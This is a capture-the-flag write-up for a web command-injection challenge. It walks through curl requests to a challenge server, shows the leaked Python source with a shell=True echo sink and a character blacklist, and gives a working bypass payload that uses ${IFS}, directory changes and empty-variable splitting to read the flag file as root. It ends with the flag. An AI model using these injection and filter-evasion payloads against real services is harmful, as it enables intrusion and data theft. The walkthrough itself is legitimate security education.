# Sarapakaribe

**Category:** Web / Command Injection (filter bypass)
**Points:** 364
**Author:** 0xRobiul

## Problem Description

> Piliz do I want to reach 1 million what ever it is!

Service: `http://160.187.130.156:10914/` — a YouTube-themed "Subscribe Verify Panel"
that asks you to enter an email to "verify". The frontend POSTs `{"name": email}` to
`/submit` and renders the JSON response.

## Approach

### 1. The reflection oracle

```bash
curl -s -X POST http://160.187.130.156:10914/submit \
  -H 'Content-Type: application/json' -d '{"name":"test@test.com"}'
# {"success":true,"response":"test@test.com\n"}
```

The trailing `\n` immediately gives away `echo`-based output. Almost certainly
`subprocess.check_output("echo " + name, shell=True)` style.

### 2. Probing the filter

- `{{7+7}}` → echoed verbatim (so it's not a templating engine)
- `{{7*7}}` → `Invalid Characters` (some chars are filtered)
- `test@test.com hello` → `Invalid Characters` (space blocked)
- `$(id)@a.b` → **`uid=0(root) gid=0(root) groups=0(root)@a.b\n`** ← we are root via shell substitution

### 3. Read the source via redirection (`<`)

`ls` shows `__pycache__ main.py requirements.txt templates`. `<` is not blocked, so:

```bash
curl -s -X POST .../submit -H 'Content-Type: application/json' \
  -d '{"name":"$(cat<main.py)@a.b"}'
```

The dump reveals the exact filter:

```python
invalid_chars = [
    " ", "less", "more", "head", "tail", "grep", "awk", "sed",
    "flag", "txt", "base", "*", "/", ";", "[", "]", "\"", "'", "?"
]
...
get_output = subprocess.check_output(
    f"echo " + name, shell=True, executable="/bin/bash"
)
```

So the substrings `flag`, `txt`, `base` are blocked, plus `/`, `*`, `;`, `[`, `]`,
quotes, `?`, space, and a handful of viewer/text utilities. Crucially, allowed are:
`cat`, `$`, `{`, `}`, `(`, `)`, `&&`, `<`, `>`, backticks, `IFS`, `HOME`, `PWD`, etc.

### 4. Bypass the filter

The flag lives at `/flag.txt` (revealed by `cd $HOME && cd .. && ls`).

Three filters to dodge in one payload:

| Forbidden | Bypass |
|---|---|
| space     | `${IFS}` |
| `/`       | `cd $HOME && cd ..` to land in `/` |
| `flag`    | split with empty parameter: `fl${z}ag` |
| `txt`     | split with empty parameter: `t${z}xt` |

None of `flag` / `txt` ever appear as a literal substring in the body — the unset
variable `${z}` breaks the substring while the shell expands it to nothing.

```bash
curl -s -X POST http://160.187.130.156:10914/submit \
  -H 'Content-Type: application/json' \
  -d '{"name":"$(cd${IFS}$HOME&&cd${IFS}..&&cat${IFS}fl${z}ag.t${z}xt)@a.b"}'
```

Response:

```json
{"success":true,"response":"ROBOFEST{r04d_t0_1_m1ll10n_s4r4p4k4r1b3_M6PMedbKLH8rKK31nk}@a.b\n"}
```

## Flag

```
ROBOFEST{r04d_t0_1_m1ll10n_s4r4p4k4r1b3_M6PMedbKLH8rKK31nk}
```